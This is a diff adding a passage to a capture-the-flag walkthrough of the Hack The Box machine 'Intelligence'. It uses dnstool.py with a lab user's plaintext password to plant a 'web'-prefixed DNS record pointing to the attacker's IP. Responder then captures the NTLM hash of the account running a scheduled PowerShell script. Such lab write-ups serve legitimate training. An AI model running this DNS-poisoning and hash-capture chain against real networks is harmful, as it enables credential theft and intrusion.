@@ -137,10 +137,60 @@ further enumeration led to going in the IT share ->
 
 <figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>
 
-We find this powershell script:
+We find this PowerShell script:
 
 <figure><img src="../../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>
 
 > The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.
 
 <figure><img src="../../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>
+
+> in theory, if we can add a DNS record that starts with `web`, which points to a machine that we control, then we can potentially get the NTLM hash of the user, the script is running as!
+
+`dnstool.py` is a script that comes with [Krbrelayx](https://github.com/dirkjanm/krbrelayx)&#x20;
+
+before interacting with Kerberos, we have to make sure that our machine’s time is in sync with the target machine. Generally, we can use things like Nmap output, HTTP header etc to determine the target’s time and change our machine time with `date` command.
+
+```
+sudo ntpdate 10.129.44.184
+```
+
+<figure><img src="../../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>
+
+then we go and interract ->
+
+```
+python dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r webfelix.intelligence.htb -a add -d 10.10.14.166 10.129.44.184
+```
+
+* `-u`: This option specifies the username for authentication. In this case, the username is `intelligence.htb\\Tiffany.Molina`.
+* `-p`: This option specifies the password for authentication. Here, the password is `NewIntelligenceCorpUser9876`.
+* `-r`: This option specifies the remote DNS server to which the tool will connect. Here, the remote DNS server is `webfelix.intelligence.htb`.
+* `-a`: This option specifies the action to perform. The value `add` indicates that a new DNS record will be added.
+* `-d`: This option specifies the IP addresses for the DNS record. In this case, the IP addresses are `10.10.14.166` and `10.129.44.184`. in summary, this command is attempting to add a new DNS record to the `webfelix.intelligence.htb` remote DNS server using the provided username and password, with the new DNS record pointing to the IP addresses `10.10.14.166` and `10.129.44.184`.
+
+<figure><img src="../../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>
+
+Okay, we successfully add a new record, next →
+
+when I launch my responder, I get this error →
+
+```
+responder -I tun0
+```
+
+<figure><img src="../../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>
+
+So I check which program is currently running on this port:
+
+```
+netstat -tuln
+```
+
+<figure><img src="../../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>
+
+i can get more info on what's running with the following command
+
+```
+sudo lsof -i :80
+```
